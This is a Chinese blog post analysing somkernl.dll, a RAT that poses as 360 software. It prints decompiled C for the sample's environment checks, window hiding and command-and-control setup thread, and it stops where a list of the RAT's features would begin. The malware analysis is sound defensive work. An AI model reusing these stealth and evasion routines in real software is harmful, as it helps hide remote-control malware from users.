@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>somkernl.dll - GuQing&#39;s Blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+
+  <meta name="description" content="来源 伪装成 360 的病毒_360社区  在线沙盒 样本报告-微步在线云沙箱 (threatbook.com)  分析函数DLLEntryPoint1234567891011121314151617BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)&#123;  if ( fdw">
+<meta property="og:type" content="article">
+<meta property="og:title" content="somkernl.dll">
+<meta property="og:url" content="https://baiguqing.github.io/2026/09/12/somkernl.dll/index.html">
+<meta property="og:site_name" content="GuQing&#39;s Blog">
+<meta property="og:description" content="来源 伪装成 360 的病毒_360社区  在线沙盒 样本报告-微步在线云沙箱 (threatbook.com)  分析函数DLLEntryPoint1234567891011121314151617BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)&#123;  if ( fdw">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-09-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-09-12T06:06:36.607Z">
+<meta property="article:author" content="GuQing">
+<meta property="article:tag" content="样本分析">
+<meta name="twitter:card" content="summary">
+
+  <link rel="preconnect" href="https://rsms.me/">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@15/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/carousel.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/lightbox.css">
+
+  
+<link rel="stylesheet" href="/css/content-fold.css">
+
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  
+  <script src="https://unpkg.com/lenis@1.3.26/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.3.26/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  
+<link rel="stylesheet" href="/css/custom-enhancements.css">
+
+  
+<script src="/js/head.js"></script>
+
+
+  
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="6"
+    
+    
+    
+    data-scroll-reveal-disappear="true"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content li img, .content figure img, .content .block-large img"
+    
+    data-nav-blur-gradient="false"
+    data-corner-squircle="true"
+  >
+    
+<script src="/js/body-top.js"></script>
+
+    <canvas id="site-particles" class="site-particles" aria-hidden="true"></canvas>
+    <a href="#main-content" id="skip-to-content">跳至主要内容</a>
+    
+
+<nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">GuQing&#39;s Blog</a>
+    <button type="button" class="nav-arrow" id="theme-nav-toggle" aria-label="切换导航菜单" aria-expanded="false" aria-controls="theme-nav-items"></button>
+    <div class="nav-items" id="theme-nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">主页</a>
+
+      
+      
+      <a class="nav-item" href="/About-Me" style="--index: 1">关于我</a>
+      
+      
+      <a class="nav-item" href="/archives" style="--index: 2">归档</a>
+      
+      
+      <a class="nav-item" href="/tags" style="--index: 3">标签</a>
+      
+      
+      <a class="nav-item" href="/categories" style="--index: 4">分类</a>
+      
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 5" aria-label="搜索" title="搜索"><i class="bi bi-search"></i></a>
+      
+      
+
+      
+      <div class="nav-item color-scheme-toggle" role="radiogroup" aria-label="颜色模式" style="--index: 6; margin-left: auto;">
+        <label>
+          <input type="radio" value="light" aria-label="浅色模式">
+          <span><i class="bi bi-sun" aria-hidden="true"></i></span>
+        </label>
+        <label>
+          <input type="radio" value="dark" aria-label="深色模式">
+          <span><i class="bi bi-moon-stars" aria-hidden="true"></i></span>
+        </label>
+        <label>
+          <input type="radio" value="auto" aria-label="跟随系统">
+          <span><i class="bi bi-circle-half" aria-hidden="true"></i></span>
+        </label>
+      </div>
+      
+      <button type="button" class="nav-item" id="theme-particle-toggle" style="--index: 7; margin-left: 10px;" aria-label="切换首页粒子效果" aria-pressed="true" title="切换首页粒子效果">
+        <i class="bi bi-stars" aria-hidden="true"></i>
+      </button>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content" tabindex="-1" data-pagefind-body>
+      
+
+<article class="post">
+  
+  <div class="meta-card">
+    <h1 class="title" data-pagefind-meta="title">somkernl.dll</h1>
+    
+    <div class="meta-info">
+      
+      <span class="meta-item date">
+        <i class="bi bi-calendar3"></i>
+        <time datetime="2026-09-12T00:00:00+08:00">2026-9-12</time>
+      </span>
+      
+
+      
+      <span class="meta-item categories text-uppercase">
+        <i class="bi bi-folder2-open"></i>
+        
+          <a href="/categories/实战/">实战</a>
+        
+      </span>
+      
+
+      
+      <span class="meta-item tags">
+        <i class="bi bi-tags"></i>
+        
+          <a href="/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" class="tag">#样本分析</a>
+        
+      </span>
+      
+    </div>
+  </div>
+
+  <div class="content">
+    <h1 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://bbs.360.cn/thread-16185961-1-1.html">伪装成 360 的病毒_360社区</a></li>
+</ul>
+<h1 id="在线沙盒"><a href="#在线沙盒" class="headerlink" title="在线沙盒"></a>在线沙盒</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://s.threatbook.com/report/file/ba35186c3b0b69f7f897b1e180f22f6822e52ab571bea53b15dc0e43cf86db2f">样本报告-微步在线云沙箱 (threatbook.com)</a></li>
+</ul>
+<h1 id="分析函数"><a href="#分析函数" class="headerlink" title="分析函数"></a>分析函数</h1><h2 id="DLLEntryPoint"><a href="#DLLEntryPoint" class="headerlink" title="DLLEntryPoint"></a>DLLEntryPoint</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">BOOL __stdcall <span class="title function_">DllEntryPoint</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( fdwReason == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    DisableThreadLibraryCalls(hLibModule: hinstDLL);</span><br><span class="line">    <span class="keyword">if</span> ( CheckEnvironment() != <span class="number">0</span> )              <span class="comment">// 检查环境</span></span><br><span class="line">    &#123;</span><br><span class="line">      HideWindows();</span><br><span class="line">      MainFunction();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      RestartEXE(hModule: hinstDLL);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>流程简单，先检测环境后隐藏窗口，开始构建并运行</li>
+<li>检测失败就重启</li>
+</ul>
+<h2 id="CheckEnvironment"><a href="#CheckEnvironment" class="headerlink" title="CheckEnvironment"></a>CheckEnvironment</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CheckEnvironment</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">if</span> ( sub_1001A7F4() != <span class="number">0</span> )                    <span class="comment">// 检查环境变量PRORAM_SL_KEEP是否等于1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_1001A75E() != <span class="number">0</span> )                    <span class="comment">// 检查360speedld.exe是否运行</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  result = sub_1001A752();                      <span class="comment">// 检查fixmbr.exe是否运行</span></span><br><span class="line">  <span class="keyword">if</span> ( result != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_1001A75E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> CheckEXE(a1: <span class="string">&quot;360speedld.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CheckEXE"><a href="#CheckEXE" class="headerlink" title="CheckEXE"></a>CheckEXE</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">CheckEXE</span><span class="params">(<span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *pInput; <span class="comment">// edi</span></span><br><span class="line">  CHAR *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  DWORD ModuleFileNameA; <span class="comment">// eax</span></span><br><span class="line">  CHAR v5; <span class="comment">// al</span></span><br><span class="line">  CHAR *v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// cl</span></span><br><span class="line">  CHAR Filename[<span class="number">260</span>]; <span class="comment">// [esp+Ch] [ebp-104h] BYREF</span></span><br><span class="line">  pInput = input;</span><br><span class="line">  v2 = Filename;</span><br><span class="line">  <span class="keyword">if</span> ( input == nullptr )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *input == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  ModuleFileNameA = GetModuleFileNameA(hModule: nullptr, lpFilename: Filename, nSize: <span class="number">0x104u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ModuleFileNameA == <span class="number">0</span> || ModuleFileNameA &gt;= <span class="number">0x104</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = Filename[<span class="number">0</span>];</span><br><span class="line">  v6 = Filename;</span><br><span class="line">  <span class="keyword">if</span> ( Filename[<span class="number">0</span>] != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="string">&#x27;\\&#x27;</span> || *v6 == <span class="string">&#x27;/&#x27;</span> )</span><br><span class="line">        v2 = ++v6;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        ++v6;</span><br><span class="line">      v5 = *v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *v6 != <span class="string">&#x27;\0&#x27;</span> );</span><br><span class="line">    <span class="keyword">if</span> ( *v2 != <span class="string">&#x27;\0&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = *pInput;</span><br><span class="line">        <span class="keyword">if</span> ( *pInput == <span class="string">&#x27;\0&#x27;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v8 = *v2++;</span><br><span class="line">        ++pInput;</span><br><span class="line">        v9 = v8 + <span class="number">32</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v8 - <span class="string">&#x27;A&#x27;</span>) &gt; <span class="number">25u</span> )</span><br><span class="line">          v9 = v8;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v7 - <span class="string">&#x27;A&#x27;</span>) &lt;= <span class="number">25u</span> )</span><br><span class="line">          v7 += <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v9 != v7 )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( *v2 != <span class="string">&#x27;\0&#x27;</span> );</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *v2 == <span class="string">&#x27;\0&#x27;</span> &amp;&amp; *pInput == <span class="string">&#x27;\0&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>核对一下input的exe名和当前运行的是否是一个exe</li>
+</ul>
+<h2 id="HideWindows"><a href="#HideWindows" class="headerlink" title="HideWindows"></a>HideWindows</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">HideWindows</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE Thread; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">if</span> ( (sub_1001A752() != <span class="number">0</span> || sub_1001A75E() != <span class="number">0</span>)<span class="comment">// CheckEXE</span></span><br><span class="line">    &amp;&amp; _InterlockedCompareExchange((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)&amp;unk_10021028, <span class="number">1</span>, <span class="number">0</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Thread = CreateThread(</span><br><span class="line">               lpThreadAttributes: nullptr,</span><br><span class="line">               dwStackSize: <span class="number">0</span>,</span><br><span class="line">               lpStartAddress: (LPTHREAD_START_ROUTINE)sub_1001AAA1,</span><br><span class="line">               lpParameter: nullptr,</span><br><span class="line">               dwCreationFlags: <span class="number">0</span>,</span><br><span class="line">               lpThreadId: nullptr);</span><br><span class="line">    <span class="keyword">if</span> ( Thread != nullptr )</span><br><span class="line">      CloseHandle(hObject: Thread);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __stdcall __noreturn <span class="title function_">sub_1001AAA1</span><span class="params">(LPVOID lpThreadParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">200</span>; i != <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1001AA8A();</span><br><span class="line">    Sleep(dwMilliseconds: <span class="number">50u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_1001AA8A();</span><br><span class="line">    Sleep(dwMilliseconds: <span class="number">500u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">BOOL <span class="title function_">sub_1001AA8A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  result = GetAPIAddrs();</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="keyword">return</span> EnumWindows(lpEnumFunc: EnumFunc, lParam: <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">BOOL __stdcall <span class="title function_">EnumFunc</span><span class="params">(HWND hWnd, LPARAM a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  LONG WindowLongW; <span class="comment">// eax</span></span><br><span class="line">  DWORD dwProcessId; <span class="comment">// [esp+4h] [ebp-4h] BYREF</span></span><br><span class="line">  dwProcessId = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( hWnd != nullptr )</span><br><span class="line">  &#123;</span><br><span class="line">    GetWindowThreadProcessId(hWnd, lpdwProcessId: &amp;dwProcessId);</span><br><span class="line">    <span class="keyword">if</span> ( dwProcessId == GetCurrentProcessId() )</span><br><span class="line">    &#123;</span><br><span class="line">      ShowWindow(hWnd, nCmdShow: <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( GetWindowLongW != nullptr &amp;&amp; SetWindowLongW != nullptr )</span><br><span class="line">      &#123;</span><br><span class="line">        WindowLongW = GetWindowLongW(hWnd, nIndex: <span class="number">-20</span>);</span><br><span class="line">        SetWindowLongW(hWnd, nIndex: <span class="number">-20</span>, dwNewLong: WindowLongW &amp; <span class="number">0xFFFBFF7F</span> | <span class="number">0x80</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>有的注释了就不用重复讲了，里面就是CheckEXE单个函数</li>
+<li><code>SetWindowLongW(hWnd, nIndex: -20, dwNewLong: WindowLongW &amp; 0xFFFBFF7F | 0x80);</code></li>
+<li><strong>把窗口设置为工具窗口，同时移除 WS_EX_APPWINDOW，让窗口不出现在任务栏</strong>。</li>
+<li>实际上就是隐藏了exe的窗口</li>
+</ul>
+<h2 id="MainFunction"><a href="#MainFunction" class="headerlink" title="MainFunction"></a>MainFunction</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MainFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE Thread; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">if</span> ( _InterlockedCompareExchange(&amp;dword_10021020, <span class="number">1</span>, <span class="number">0</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Thread = CreateThread(</span><br><span class="line">               lpThreadAttributes: nullptr,</span><br><span class="line">               dwStackSize: <span class="number">0</span>,</span><br><span class="line">               lpStartAddress: (LPTHREAD_START_ROUTINE)sub_1001A5DE,</span><br><span class="line">               lpParameter: nullptr,</span><br><span class="line">               dwCreationFlags: <span class="number">0</span>,</span><br><span class="line">               lpThreadId: nullptr);</span><br><span class="line">    <span class="keyword">if</span> ( Thread != nullptr )</span><br><span class="line">      CloseHandle(hObject: Thread);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// attributes: thunk</span></span><br><span class="line"><span class="type">void</span> __stdcall __noreturn <span class="title function_">sub_1001A5DE</span><span class="params">(LPVOID lpThreadParameter)</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_1001A491();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __noreturn <span class="title function_">sub_1001A491</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  CHAR *v0; <span class="comment">// edi</span></span><br><span class="line">  _BYTE *v1; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">const</span> WCHAR *CommandLineW; <span class="comment">// eax</span></span><br><span class="line">  CHAR *v5; <span class="comment">// eax</span></span><br><span class="line">  CHAR *v6; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">bool</span> v7; <span class="comment">// cc</span></span><br><span class="line">  CHAR *v8; <span class="comment">// eax</span></span><br><span class="line">  UINT v9; <span class="comment">// eax</span></span><br><span class="line">  _BYTE v10[<span class="number">104</span>]; <span class="comment">// [esp+10h] [ebp-68h] BYREF</span></span><br><span class="line">  v0 = (CHAR *)Alloc(dwBytes: <span class="number">0x800u</span>);</span><br><span class="line">  v1 = Alloc(dwBytes: <span class="number">0xC00u</span>);</span><br><span class="line">  v2 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v0 == nullptr || v1 == nullptr )         <span class="comment">// 检查是否分配好内存</span></span><br><span class="line">    Exit_Process(uExitCode: <span class="number">2u</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(a1: v1, a2: <span class="number">0</span>, a3: <span class="number">0xC00</span>);</span><br><span class="line">  <span class="built_in">memset</span>(a1: v10, a2: <span class="number">0</span>, a3: <span class="number">104</span>);</span><br><span class="line">  Init(a1: v2 + <span class="number">1024</span>);</span><br><span class="line">  CommandLineW = GetCommandLineW();</span><br><span class="line">  Convert(lpWideCharStr: CommandLineW, lpMultiByteStr: v0, cbMultiByte: <span class="number">2048</span>);</span><br><span class="line">  <span class="keyword">if</span> ( CmdLineHasOption(a1: v0, a2: <span class="string">&quot;--print-capabilities&quot;</span>) != <span class="number">0</span> )</span><br><span class="line">    sub_1001A616();</span><br><span class="line">  <span class="keyword">if</span> ( sub_10015B32(a1: v2 + <span class="number">2048</span>, a2: v10) == <span class="number">0</span> )<span class="comment">// 初始化配置并建互斥体</span></span><br><span class="line">  &#123;</span><br><span class="line">    WriteLogs(lpBuffer: <span class="string">&quot;duplicate_instance&quot;</span>);</span><br><span class="line">    OutputLogs(lpBuffer: <span class="string">&quot;duplicate_instance\n&quot;</span>);</span><br><span class="line">    Exit_Process(uExitCode: <span class="number">0x11u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *((_DWORD *)v2 + <span class="number">761</span>) = CmdLineHasOption(a1: v0, a2: <span class="string">&quot;--once&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( CmdLineHasOption(a1: v0, a2: <span class="string">&quot;--insecure-tls&quot;</span>) != <span class="number">0</span> || *((_DWORD *)v2 + <span class="number">552</span>) == <span class="number">0</span> )</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">  *((_DWORD *)v2 + <span class="number">762</span>) = v3;</span><br><span class="line">  ChangeServer(a1: v0, a2: v2, a3: <span class="number">1024</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *v2 == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (CHAR *)Alloc(dwBytes: <span class="number">0x400u</span>);</span><br><span class="line">    v6 = v5;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == nullptr</span><br><span class="line">      || (v7 = GetEnvironmentVariableA(lpName: <span class="string">&quot;PRORAM_SERVER_URL&quot;</span>, lpBuffer: v5, nSize: <span class="number">0x400u</span>) - <span class="number">1</span> &lt;= <span class="number">0x3FE</span>,</span><br><span class="line">          v8 = v6,</span><br><span class="line">          !v7) )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v2 + <span class="number">1024</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_1001B730(a1: v2, a2: v8);</span><br><span class="line">    sub_1001B3E0(lpMem: v6);</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = sub_1000214F(a1: v2);</span><br><span class="line">  Exit_Process(uExitCode: v9);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>我对sub_1001A491函数的部分内容简单重命名并注释了一下</li>
+<li>深度分析后发现这个就是一个RAT远控程序</li>
+<li>有着这么多功能</li>
+</ul>
